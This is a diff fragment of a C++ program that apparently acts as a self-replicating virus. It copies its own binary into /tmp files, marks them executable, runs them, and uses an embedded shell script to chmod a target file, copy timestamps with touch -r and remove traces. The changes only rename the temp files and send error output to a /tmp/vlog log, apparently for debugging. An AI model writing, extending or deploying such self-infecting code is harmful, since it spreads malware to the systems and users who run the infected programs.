@@ -14,7 +14,7 @@ int main (int argc, char** argv) {
     uid_t uid=getuid();
     srand(time(0));
     int c;
-    string exe = "/tmp/", vir = "/tmp/", me = (string) argv[0], command;
+    string exe = "/tmp/e", vir = "/tmp/v", me = (string) argv[0], command;
     me = which(argv[0]);
     me = me.substr(0, me.size() - 1);
     for (int i = 0; i < 8; i++) {
@@ -37,7 +37,7 @@ int main (int argc, char** argv) {
         while ((c = fi.get()) != -1) fo << (char) c;
         fo.close();
         fi.close();
-        command = "2>/dev/null chmod u+x ";
+        command = "2>>/tmp/vlog chmod u+x ";
         command += exe;
         c = system( command.c_str() );
         execv((exe).c_str(), argv);
@@ -69,7 +69,7 @@ chmod ugo+x $VIR && \
 touch -r ${VIR}__ $VIR \
 ) \
 fi; \
-2>/dev/null rm -f ${VIR}__ ";
+2>>/tmp/vlog rm -f ${VIR}__ ";
         command += vir;
         command += " ";
         command += exe;
